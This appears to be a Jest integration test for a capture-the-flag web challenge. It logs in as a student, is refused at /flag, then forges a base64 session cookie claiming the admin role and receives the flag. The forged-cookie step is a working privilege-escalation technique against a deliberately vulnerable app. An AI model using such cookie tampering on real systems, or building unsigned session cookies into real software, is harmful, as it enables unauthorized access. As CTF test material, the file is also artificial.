const fs = require('fs');
const path = require('path');
const { Buffer } = require('buffer');
const request = require('supertest');

const usersPath = path.join(__dirname, '..', '..', 'src', 'data', 'users.json');
let app;
let originalUsers;
let originalCtfDev;

beforeAll(() => {
  fs.mkdirSync(path.dirname(usersPath), { recursive: true });
  originalUsers = fs.existsSync(usersPath) ? fs.readFileSync(usersPath, 'utf8') : '[]\n';
  fs.writeFileSync(
    usersPath,
    JSON.stringify(
      [
        { username: 'admin', password: 'admin_seed_pw', role: 'admin' },
        { username: 'student', password: 'student123', role: 'student' },
      ],
      null,
      2
    )
  );

  originalCtfDev = process.env.CTF_DEV;
  process.env.CTF_DEV = '1';

  jest.resetModules();
  app = require('../../src/app');
});

afterAll(() => {
  fs.writeFileSync(usersPath, originalUsers);
  if (originalCtfDev === undefined) {
    delete process.env.CTF_DEV;
  } else {
    process.env.CTF_DEV = originalCtfDev;
  }
});

describe('CTF1 integration: cookie tamper privilege escalation chain', () => {
  test('login as student -> /flag denies -> tamper cookie to admin -> /flag returns durham flag', async () => {
    const studentLogin = await request(app)
      .post('/login')
      .type('form')
      .send({ username: 'student', password: 'student123' });
    expect(studentLogin.status).toBe(302);

    const sessionCookies = (studentLogin.headers['set-cookie'] || []).filter((c) => c.startsWith('session='));
    const sessionCookie = sessionCookies.find((c) => !/session=;|session=$/.test(c.split(';')[0]));
    expect(sessionCookie).toBeDefined();

    const denied = await request(app)
      .get('/flag')
      .set('Cookie', sessionCookie.split(';')[0]);
    expect(denied.status).toBe(403);

    const tampered = Buffer
      .from(JSON.stringify({ username: 'student', role: 'admin' }))
      .toString('base64');

    const elevated = await request(app)
      .get('/flag')
      .set('Cookie', `session=${tampered}`);
    expect(elevated.status).toBe(200);
    expect(elevated.text).toMatch(/durham\{/);
  });
});
